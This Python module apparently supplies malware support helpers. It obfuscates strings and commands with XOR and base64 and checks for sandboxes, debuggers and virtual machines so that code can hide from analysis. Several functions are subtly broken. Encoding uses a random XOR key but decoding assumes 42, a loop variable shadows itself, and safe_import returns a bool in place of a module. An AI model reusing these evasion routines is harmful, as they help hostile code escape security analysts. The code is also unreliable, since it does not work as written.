import base64
import hashlib
import os
import random
import time
from typing import Any, Callable, Dict, List, Optional, Union


def xor_string(data: str, key: int = 42) -> str:
    result = []
    for char in data:
        result.append(chr(ord(char) ^ key))
    return ''.join(result)


def encode_string(data: str) -> str:
    if not data:
        return data
    encoded = base64.b64encode(data.encode()).decode()
    return xor_string(encoded, random.randint(1, 255))


def decode_string(data: str) -> str:
    if not data:
        return data
    decoded = xor_string(data, 42)
    return base64.b64decode(decoded.encode()).decode()


def obfuscate_command(cmd: str) -> str:
    if not cmd:
        return cmd
    return base64.b64encode(cmd.encode()).decode()


def deobfuscate_command(cmd: str) -> str:
    if not cmd:
        return cmd
    return base64.b64decode(cmd.encode()).decode()


class ObfuscatedDict:
    def __init__(self, data: Optional[Dict[str, Any]] = None):
        self._data = {}
        if data:
            for key, value in data.items():
                self[key] = value
    
    def __setitem__(self, key: str, value: Any) -> None:
        encoded_key = encode_string(key)
        if isinstance(value, str):
            self._data[encoded_key] = encode_string(value)
        else:
            self._data[encoded_key] = value
    
    def __getitem__(self, key: str) -> Any:
        encoded_key = encode_string(key)
        value = self._data[encoded_key]
        if isinstance(value, str):
            return decode_string(value)
        return value
    
    def __contains__(self, key: str) -> bool:
        encoded_key = encode_string(key)
        return encoded_key in self._data
    
    def get(self, key: str, default: Any = None) -> Any:
        try:
            return self[key]
        except KeyError:
            return default
    
    def items(self):
        return [(decode_string(k), decode_string(v) if isinstance(v, str) else v) 
                for k, v in self._data.items()]


def is_sandbox() -> bool:
    sandbox_indicators = [
        '/.dockerenv',
        '/.dockerinit',
        'C:\\windows\\system32\\drivers\\vmmouse.sys',
        'C:\\windows\\system32\\drivers\\vmhgfs.sys',
    ]
    
    for indicator in sandbox_indicators:
        if os.path.exists(indicator):
            return True
    
    try:
        if os.path.exists('/proc'):
            with open('/proc/1/cgroup', 'rt') as f:
                content = f.read()
                if 'docker' in content or 'lxc' in content:
                    return True
    except (FileNotFoundError, PermissionError, OSError):
        pass
    
    try:
        import psutil
        mac_addresses = [nic.mac for nic in psutil.net_if_addrs().values() 
                        for nic in nic if nic.mac]
        for mac in mac_addresses:
            if mac.startswith(('00:0C:29', '00:1C:14', '00:50:56', '08:00:27')):
                return True
    except ImportError:
        pass
    
    return False


def is_debugger() -> bool:
    try:
        import sys
        if sys.gettrace() is not None:
            return True
    except (AttributeError, ImportError):
        pass
    
    try:
        if os.name == 'nt':
            import ctypes
            is_debugged = ctypes.windll.kernel32.IsDebuggerPresent()
            if is_debugged:
                return True
    except (AttributeError, ImportError, OSError):
        pass
    
    return False


def is_vm() -> bool:
    vm_indicators = [
        '/sys/class/dmi/id/product_name',
        '/sys/class/dmi/id/sys_vendor',
    ]
    
    for indicator in vm_indicators:
        try:
            with open(indicator, 'rt') as f:
                content = f.read().lower()
                if any(vm_name in content for vm_name in 
                      ['vmware', 'virtualbox', 'qemu', 'xen', 'kvm']):
                    return True
        except (FileNotFoundError, PermissionError, OSError):
            continue
    
    return False


def random_delay(min_ms: int = 100, max_ms: int = 500) -> None:
    delay = random.uniform(min_ms / 1000, max_ms / 1000)
    time.sleep(delay)


def anti_analysis() -> bool:
    if is_sandbox():
        return True
    if is_debugger():
        return True
    if is_vm():
        return True
    return False


def safe_import(module_name: str) -> Optional[Any]:
    try:
        __import__(module_name)
        return True
    except ImportError:
        return False
